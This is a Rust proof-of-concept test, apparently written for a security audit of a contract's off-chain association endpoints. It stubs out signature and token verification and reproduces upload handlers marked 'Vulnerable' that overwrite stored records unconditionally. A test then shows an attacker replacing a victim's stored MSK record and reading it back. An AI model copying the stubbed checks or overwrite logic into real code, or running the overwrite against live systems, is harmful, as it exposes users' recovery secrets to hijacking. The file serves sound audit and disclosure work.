use crate::storage::Mapping;

// --- Shim crates that mimic the contract's dependencies so that we can reuse the
// upload/get-secret-share handlers without touching production code.
pub mod shim_matchit {
    #[derive(Default, Clone)]
    pub struct Params;
}

pub use shim_matchit::Params;
extern crate self as matchit;

pub mod shim_pbc_contract_common {
    pub mod off_chain {
        use std::collections::{BTreeMap, HashMap};

        #[derive(Clone, Debug)]
        pub struct HttpRequestData {
            pub method: String,
            pub uri: String,
            pub body: Vec<u8>,
        }

        impl HttpRequestData {
            pub fn new(method: &str, uri: &str, body: Vec<u8>) -> Self {
                Self {
                    method: method.to_lowercase(),
                    uri: uri.to_string(),
                    body,
                }
            }
        }

        #[derive(Clone, Debug)]
        pub struct HttpResponseData {
            pub status_code: u32,
            pub body: Vec<u8>,
        }

        impl HttpResponseData {
            pub fn new_with_str(status_code: u32, body: &str) -> Self {
                Self {
                    status_code,
                    body: body.as_bytes().to_vec(),
                }
            }

            pub fn status_code(&self) -> u32 {
                self.status_code
            }

            pub fn body(&self) -> &[u8] {
                &self.body
            }
        }

        #[derive(Default, Clone)]
        pub struct OffChainContext {
            storages: HashMap<Vec<u8>, BTreeMap<Vec<u8>, Vec<u8>>>,
        }

        impl OffChainContext {
            pub fn storage(
                &mut self,
                collection: &[u8],
            ) -> OffChainStorage<'_, Vec<u8>, Vec<u8>> {
                let entry = self
                    .storages
                    .entry(collection.to_vec())
                    .or_insert_with(BTreeMap::new);
                OffChainStorage { inner: entry }
            }
        }

        pub struct OffChainStorage<'a, K, V> {
            inner: &'a mut BTreeMap<K, V>,
        }

        impl<'a, K: Ord, V> OffChainStorage<'a, K, V> {
            pub fn insert(&mut self, k: K, v: V) {
                self.inner.insert(k, v);
            }

            pub fn get(&self, k: &K) -> Option<&V> {
                self.inner.get(k)
            }
        }
    }
}

pub use shim_pbc_contract_common::off_chain::{HttpRequestData, HttpResponseData, OffChainContext};
extern crate self as pbc_contract_common;

// Minimal encode helpers to mirror the real StrEncoded wrapper.
pub mod shim_swafe_lib {
    use serde::{Deserialize, Serialize};

    #[derive(Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
    pub struct NodeId(pub String);

    impl NodeId {
        pub fn eval_point(&self) -> u32 {
            // Deterministic but trivial mapping for the PoC.
            self.0.len() as u32
        }
    }

    pub mod association {
        use serde::{Deserialize, Serialize};

        use crate::shim_swafe_lib::crypto::EmailCertToken;
        use crate::shim_swafe_lib::encode::StrEncoded;
        use crate::shim_swafe_lib::NodeId;

        #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, Hash)]
        pub struct MskRecord(pub String);

        #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
        pub struct AssociationRequestEmail {
            pub fixed_user_pk: String,
            pub payload: String,
            pub token: Option<StrEncoded<EmailCertToken>>,
        }

        impl AssociationRequestEmail {
            pub fn verify(
                self,
                user_pk: &String,
                _node_id: &NodeId,
            ) -> Result<MskRecord, String> {
                if &self.fixed_user_pk != user_pk {
                    return Err("user pk mismatch".into());
                }
                // Token is ignored for the PoC; production uses SoK and commitments.
                let _ = self.token;
                Ok(MskRecord(self.payload))
            }
        }

        #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
        pub struct EncapsulatedMsk(pub String);

    }

    pub mod crypto {
        use serde::{Deserialize, Serialize};

        use crate::shim_swafe_lib::EmailInput;
        use crate::shim_swafe_lib::{EmailKey, NodeId};

        #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
        pub struct EmailCertificate(pub String);

        #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
        pub struct EmailCertToken {
            pub email: String,
            pub user_pk: String,
        }

        pub struct EmailCert;

        impl EmailCert {
            pub fn verify<'a>(
                _swafe_pk: &str,
                _node_id: &NodeId,
                token: &'a EmailCertToken,
                _now: u64,
            ) -> Result<(&'a str, &'a String), String> {
                // In the real code this verifies signatures and expiry. The PoC does not
                // need cryptographic validity; we only require the email and user key.
                Ok((token.email.as_str(), &token.user_pk))
            }
        }

        #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
        pub struct VdrfPublicKey(pub String);

        #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
        pub struct VdrfEvaluation(pub String);

        pub struct Vdrf;

        impl Vdrf {
            pub fn verify(
                _pk: &VdrfPublicKey,
                email: &EmailInput,
                eval: VdrfEvaluation,
            ) -> Result<EmailKey, String> {
                Ok(EmailKey(format!("{}::{:?}", email.email, eval.0)))
            }
        }
    }

    #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, Hash)]
    pub struct EmailKey(pub String);

    impl EmailKey {
        pub fn new(
            _pk: &crate::shim_swafe_lib::crypto::VdrfPublicKey,
            email: &EmailInput,
            eval: crate::shim_swafe_lib::crypto::VdrfEvaluation,
        ) -> Result<Self, String> {
            Ok(EmailKey(format!("{}::{:?}", email.email, eval.0)))
        }
    }

    #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
    pub struct EmailInput {
        pub email: String,
    }

    impl std::str::FromStr for EmailInput {
        type Err = String;

        fn from_str(s: &str) -> Result<Self, Self::Err> {
            Ok(EmailInput {
                email: s.to_string(),
            })
        }
    }

    pub mod encode {
        use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine as _};
        use serde::{de::DeserializeOwned, Deserialize, Deserializer, Serialize, Serializer};

        #[derive(Clone, Debug, PartialEq, Eq)]
        pub struct StrEncoded<T>(pub T);

        impl<T: Serialize> Serialize for StrEncoded<T> {
            fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
            where
                S: Serializer,
            {
                let bytes = serde_json::to_vec(&self.0)
                    .map_err(|e| serde::ser::Error::custom(format!("encode error: {e}")))?;
                let encoded = STANDARD_NO_PAD.encode(bytes);
                serializer.serialize_str(&encoded)
            }
        }

        impl<'de, T: DeserializeOwned> Deserialize<'de> for StrEncoded<T> {
            fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
            where
                D: Deserializer<'de>,
            {
                let encoded = String::deserialize(deserializer)?;
                let bytes = STANDARD_NO_PAD
                    .decode(encoded.as_bytes())
                    .map_err(|e| serde::de::Error::custom(format!("decode error: {e}")))?;
                let value = serde_json::from_slice(&bytes)
                    .map_err(|e| serde::de::Error::custom(format!("decode error: {e}")))?;
                Ok(StrEncoded(value))
            }
        }

        pub fn serialize<T: Serialize>(value: &T) -> Result<Vec<u8>, serde_json::Error> {
            serde_json::to_vec(value)
        }

        pub fn deserialize<T: DeserializeOwned>(bytes: &[u8]) -> Result<T, serde_json::Error> {
            serde_json::from_slice(bytes)
        }
    }
}

pub use shim_swafe_lib as swafe_lib;

pub mod shim_swafe_api {
    pub mod association {
        pub mod upload_msk {
            use serde::{Deserialize, Serialize};
            use crate::swafe_lib::association::AssociationRequestEmail;
            use crate::swafe_lib::crypto::{EmailCertToken, VdrfEvaluation};
            use crate::swafe_lib::encode::StrEncoded;

            pub const PATH: &str = "/association/upload-association";

            #[derive(Clone, Serialize, Deserialize)]
            pub struct Request {
                pub token: StrEncoded<EmailCertToken>,
                pub vdrf_eval: StrEncoded<VdrfEvaluation>,
                pub association: StrEncoded<AssociationRequestEmail>,
            }

            #[derive(Serialize, Deserialize)]
            pub struct Response {
                pub success: bool,
                pub message: String,
            }
        }

        pub mod get_secret_share {
            use serde::{Deserialize, Serialize};
            use crate::swafe_lib::association::MskRecord;
            use crate::swafe_lib::crypto::{EmailCertToken, VdrfEvaluation};
            use crate::swafe_lib::encode::StrEncoded;

            pub const PATH: &str = "/association/get-ss";

            #[derive(Clone, Serialize, Deserialize)]
            pub struct Request {
                pub vdrf_eval: StrEncoded<VdrfEvaluation>,
                pub token: StrEncoded<EmailCertToken>,
            }

            #[derive(Clone, Debug, Serialize, Deserialize)]
            pub struct Response {
                pub entry: StrEncoded<MskRecord>,
            }
        }
    }
}

pub use shim_swafe_api as swafe_api;

// Contract utilities (Mapping + JSON helpers) that mirror the production ones.
pub mod storage {
    use crate::shim_pbc_contract_common::off_chain::OffChainContext;
    use crate::swafe_lib::encode;

    pub trait Mapping {
        type Key: serde::Serialize;
        type Value: serde::Serialize + serde::de::DeserializeOwned;

        const COLLECTION_NAME: &'static str;

        fn load(ctx: &mut OffChainContext, key: Self::Key) -> Option<Self::Value> {
            let storage = ctx.storage(Self::COLLECTION_NAME.as_bytes());
            let key = encode::serialize(&key).unwrap();
            encode::deserialize::<Self::Value>(storage.get(&key)?.as_ref()).ok()
        }

        fn store(ctx: &mut OffChainContext, key: Self::Key, value: Self::Value) {
            let mut storage = ctx.storage(Self::COLLECTION_NAME.as_bytes());
            let key = encode::serialize(&key).unwrap();
            let value = encode::serialize(&value).unwrap();
            // Vulnerable behaviour: unconditionally inserts, overwriting existing entries.
            storage.insert(key, value);
        }
    }
}

pub mod http {
    use serde::Serialize;

    use crate::shim_pbc_contract_common::off_chain::{HttpRequestData, HttpResponseData};

    pub mod error {
        #[derive(Debug)]
        pub enum ContractError {
            Server(ServerError),
        }

        impl From<ServerError> for ContractError {
            fn from(value: ServerError) -> Self {
                ContractError::Server(value)
            }
        }

        #[derive(Debug)]
        pub enum ServerError {
            SerializationError(String),
            VdrfNodeNotInitialized,
            InvalidParameter(String),
        }
    }

    pub fn deserialize_request_body<T: serde::de::DeserializeOwned>(
        request: &HttpRequestData,
    ) -> Result<T, error::ContractError> {
        serde_json::from_slice(&request.body)
            .map_err(|e| error::ServerError::InvalidParameter(e.to_string()).into())
    }

    pub fn create_json_response<T: Serialize>(
        status_code: u32,
        data: &T,
    ) -> Result<HttpResponseData, error::ServerError> {
        let json = serde_json::to_string(data)
            .map_err(|e| error::ServerError::SerializationError(e.to_string()))?;
        Ok(HttpResponseData::new_with_str(status_code, &json))
    }

    pub mod endpoints {
        pub mod init {
            use serde::{Deserialize, Serialize};
            use crate::swafe_lib::crypto::EmailCertToken;
            use crate::swafe_lib::encode::StrEncoded;
            use crate::swafe_lib::NodeId;

            use crate::storage::Mapping;

            #[derive(Serialize, Deserialize, Clone)]
            pub struct StoredOffchainSecret {
                pub node_id: StrEncoded<NodeId>,
                pub secret: OffchainSecret,
            }

            #[derive(Serialize, Deserialize, Clone)]
            pub struct OffchainSecret {
                pub secret_share: EmailCertToken,
            }

            #[derive(Clone, Default)]
            pub struct OffchainSecrets;

            impl Mapping for OffchainSecrets {
                type Key = ();
                type Value = StoredOffchainSecret;

                const COLLECTION_NAME: &'static str = "map:node-secret";
            }
        }

        pub mod association {
            pub mod upload_msk {
                use matchit::Params;
                use crate::shim_pbc_contract_common::off_chain::{
                    HttpRequestData, HttpResponseData, OffChainContext,
                };
                use crate::swafe_api::association::upload_msk::{self, Request, Response};
                use crate::swafe_lib::association::MskRecord;
                use crate::swafe_lib::{EmailInput, EmailKey};
                use crate::swafe_lib::crypto::{EmailCert, VdrfPublicKey};
                use crate::swafe_lib::encode;

                use crate::http::endpoints::init::OffchainSecrets;
                use crate::storage::Mapping;
                use crate::{http, ContractState};

                pub const PATH: &str = upload_msk::PATH;

                pub fn handler(
                    ctx: &mut OffChainContext,
                    state: ContractState,
                    request: HttpRequestData,
                    _params: Params,
                ) -> Result<HttpResponseData, http::error::ContractError> {
                    let request: Request = http::deserialize_request_body(&request)?;

                    let swafe_pk: String = encode::deserialize(&state.swafe_public_key)
                        .map_err(|_| http::error::ServerError::SerializationError(
                            "Failed to deserialize Swafe public key".to_owned(),
                        ))?;

                    let stored_secret = OffchainSecrets::load(ctx, ())
                        .ok_or(http::error::ServerError::VdrfNodeNotInitialized)?;

                    let vdrf_pk: VdrfPublicKey = encode::deserialize(&state.vdrf_public_key)
                        .map_err(|_| http::error::ServerError::SerializationError(
                            "Failed to deserialize VDRF public key".to_owned(),
                        ))?;

                    let node_id = stored_secret.node_id.0;

                    let (email, user_pk) = EmailCert::verify(&swafe_pk, &node_id, &request.token.0, 0)
                        .map_err(http::error::ServerError::InvalidParameter)?;

                    let email: EmailInput = email.parse().unwrap();
                    let email_tag: EmailKey = EmailKey::new(&vdrf_pk, &email, request.vdrf_eval.0)
                        .map_err(http::error::ServerError::InvalidParameter)?;

                    // Vulnerable: insert unconditionally, overwriting prior association.
                    MskRecordCollection::store(
                        ctx,
                        email_tag,
                        request
                            .association
                            .0
                            .verify(user_pk, &node_id)
                            .map_err(http::error::ServerError::InvalidParameter)?,
                    );

                    http::create_json_response(
                        200,
                        &Response {
                            success: true,
                            message: "Association uploaded successfully".to_string(),
                        },
                    )
                    .map_err(|e| e.into())
                }

                #[derive(Clone, Default)]
                pub struct MskRecordCollection;

                impl crate::storage::Mapping for MskRecordCollection {
                    type Key = EmailKey;
                    type Value = MskRecord;

                    const COLLECTION_NAME: &'static str = "map:associations";
                }
            }

            pub mod get_secret_share {
                use matchit::Params;
                use crate::shim_pbc_contract_common::off_chain::{
                    HttpRequestData, HttpResponseData, OffChainContext,
                };
                use crate::swafe_api::association::get_secret_share::{self, Request, Response};
                use crate::swafe_lib::crypto::{EmailCert, VdrfPublicKey};
                use crate::swafe_lib::{encode, EmailInput, EmailKey};

                use crate::http::endpoints::association::upload_msk::MskRecordCollection;
                use crate::http::endpoints::init::OffchainSecrets;
                use crate::storage::Mapping;
                use crate::{http, ContractState};

                pub const PATH: &str = get_secret_share::PATH;

                pub fn handler(
                    ctx: &mut OffChainContext,
                    state: ContractState,
                    request: HttpRequestData,
                    _params: Params,
                ) -> Result<HttpResponseData, http::error::ContractError> {
                    let request: Request = http::deserialize_request_body(&request)?;

                    let swafe_pk: String = encode::deserialize(&state.swafe_public_key)
                        .map_err(|_| http::error::ServerError::SerializationError(
                            "Failed to deserialize Swafe public key".to_owned(),
                        ))?;

                    let stored_secret = OffchainSecrets::load(ctx, ())
                        .ok_or(http::error::ServerError::VdrfNodeNotInitialized)?;

                    let vdrf_pk: VdrfPublicKey = encode::deserialize(&state.vdrf_public_key)
                        .map_err(|_| http::error::ServerError::SerializationError(
                            "Failed to deserialize VDRF public key".to_owned(),
                        ))?;

                    let node_id = stored_secret.node_id.0;
                    let (email, _) = EmailCert::verify(&swafe_pk, &node_id, &request.token.0, 0)
                        .map_err(http::error::ServerError::InvalidParameter)?;

                    let email: EmailInput = email.parse().unwrap();
                    let email_tag: EmailKey = EmailKey::new(&vdrf_pk, &email, request.vdrf_eval.0)
                        .map_err(http::error::ServerError::InvalidParameter)?;

                    let msk_record = MskRecordCollection::load(ctx, email_tag)
                        .ok_or_else(|| {
                            http::error::ServerError::InvalidParameter(
                                "MSK record not found".to_string(),
                            )
                        })?;

                    http::create_json_response(
                        200,
                        &Response {
                            entry: encode::StrEncoded(msk_record),
                        },
                    )
                    .map_err(|e| e.into())
                }
            }
        }
    }
}

#[derive(Clone, Default)]
pub struct ContractState {
    pub swafe_public_key: Vec<u8>,
    pub vdrf_public_key: Vec<u8>,
}

/// PoC for TC3: repeated calls to `/association/upload-association` overwrite existing
/// associations for the same email tag with attacker-controlled data because the
/// handler never checks if a prior record exists.
#[test]
fn attacker_can_overwrite_existing_association() {
    use http::endpoints::association::{get_secret_share, upload_msk};
    use crate::shim_pbc_contract_common::off_chain::HttpRequestData;
    use swafe_api::association::get_secret_share as api_get_ss;
    use swafe_api::association::upload_msk as api_upload;
    use crate::http::endpoints::association::upload_msk::MskRecordCollection;
    use crate::swafe_lib::association::AssociationRequestEmail;
    use crate::swafe_lib::crypto::{EmailCertToken, VdrfEvaluation};
    use crate::swafe_lib::encode::StrEncoded;
    use crate::swafe_lib::{EmailInput, EmailKey, NodeId};

    // --- Shared setup ------------------------------------------------------
    let mut ctx = OffChainContext::default();

    // OffchainSecrets contain the node identity. Once set, both handlers trust it.
    let node_id = NodeId("node-1".into());
    let offchain_secret = http::endpoints::init::StoredOffchainSecret {
        node_id: StrEncoded(node_id.clone()),
        secret: http::endpoints::init::OffchainSecret {
            secret_share: EmailCertToken {
                email: "ignored@example.com".to_string(),
                user_pk: "ignored-pk".to_string(),
            },
        },
    };
    println!(
        "Seeding OffchainSecrets with node_id {:?} and placeholder secret",
        node_id
    );
    http::endpoints::init::OffchainSecrets::store(&mut ctx, (), offchain_secret);

    // Contract state holds serialized public keys (opaque to our shim).
    let state = ContractState {
        swafe_public_key: swafe_lib::encode::serialize(&"swafe-pk".to_string()).unwrap(),
        vdrf_public_key: swafe_lib::encode::serialize(&swafe_lib::crypto::VdrfPublicKey(
            "vdrf-pk".to_string(),
        ))
        .unwrap(),
    };
    println!("Initialized ContractState with placeholder public keys");

    // Victim association upload uses the legitimate user key.
    let victim_user = "victim-user".to_string();
    let victim_token = EmailCertToken {
        email: "alice@example.com".into(),
        user_pk: victim_user.clone(),
    };
    let email_input: EmailInput = "alice@example.com".parse().unwrap();
    let vdrf_eval = VdrfEvaluation("email-eval".into());
    let email_tag: EmailKey =
        swafe_lib::crypto::Vdrf::verify(&swafe_lib::crypto::VdrfPublicKey("vdrf-pk".into()), &email_input, vdrf_eval.clone())
            .expect("derive tag");
    println!("Derived email_tag {:?} for victim", email_tag);

    let victim_association = AssociationRequestEmail {
        fixed_user_pk: victim_user.clone(),
        payload: "victim-msk-record".into(),
        token: None,
    };

    let victim_request = api_upload::Request {
        token: StrEncoded(victim_token.clone()),
        vdrf_eval: StrEncoded(vdrf_eval.clone()),
        association: StrEncoded(victim_association.clone()),
    };

    let victim_http_request = HttpRequestData::new(
        "post",
        upload_msk::PATH,
        serde_json::to_vec(&victim_request).expect("serialize victim upload"),
    );

    // First upload succeeds and seeds the association mapping.
    println!("Uploading victim association {:?}", victim_association);
    upload_msk::handler(
        &mut ctx,
        state.clone(),
        victim_http_request,
        Params::default(),
    )
    .expect("victim upload should succeed");
    let stored_record = MskRecordCollection::load(&mut ctx, email_tag.clone()).unwrap();
    println!("Stored record after victim upload: {:?}", stored_record);

    // Attacker possesses a *fresh* token for the same email and replays the endpoint
    // with malicious association content.
    let attacker_association = AssociationRequestEmail {
        fixed_user_pk: victim_user.clone(),
        payload: "attacker-poisoned-record".into(),
        token: None,
    };
    let attacker_request = api_upload::Request {
        token: StrEncoded(victim_token.clone()),
        vdrf_eval: StrEncoded(vdrf_eval.clone()),
        association: StrEncoded(attacker_association.clone()),
    };
    let attacker_http_request = HttpRequestData::new(
        "post",
        upload_msk::PATH,
        serde_json::to_vec(&attacker_request).expect("serialize attacker upload"),
    );

    // Critical: second upload silently overwrites the victim's stored association.
    println!(
        "Attacker attempting overwrite with association {:?}",
        attacker_association
    );
    upload_msk::handler(
        &mut ctx,
        state.clone(),
        attacker_http_request,
        Params::default(),
    )
    .expect("attacker upload should overwrite");
    let overwritten_record = MskRecordCollection::load(&mut ctx, email_tag.clone()).unwrap();
    println!(
        "Record after attacker overwrite: {:?} (should match attacker payload)",
        overwritten_record
    );

    // Fetching the secret share now returns the attacker's payload, proving the overwrite.
    let get_request = api_get_ss::Request {
        token: StrEncoded(victim_token),
        vdrf_eval: StrEncoded(vdrf_eval),
    };
    let get_http_request = HttpRequestData::new(
        "post",
        get_secret_share::PATH,
        serde_json::to_vec(&get_request).expect("serialize get request"),
    );
    let response = get_secret_share::handler(&mut ctx, state, get_http_request, Params::default())
        .expect("get-secret-share should succeed");
    assert_eq!(response.status_code(), 200);
    println!("Received response from get-secret-share: {:?}", response);

    let leaked: api_get_ss::Response =
        serde_json::from_slice(response.body()).expect("parse response body");
    println!("Decoded get-secret-share response: {:?}", leaked);
    let leaked_record: swafe_lib::association::MskRecord = leaked.entry.0;
    println!("Leaked record after overwrite: {:?}", leaked_record);

    assert_eq!(leaked_record.0, attacker_association.payload);
    assert_eq!(leaked_record.0, "attacker-poisoned-record");
    assert_eq!(email_tag, EmailKey(format!("{}::\"email-eval\"", email_input.email)));
}

/*
How to run:
    cargo test --manifest-path security-poc/Cargo.toml --test tc3_association_overwrite -- --nocapture
*/
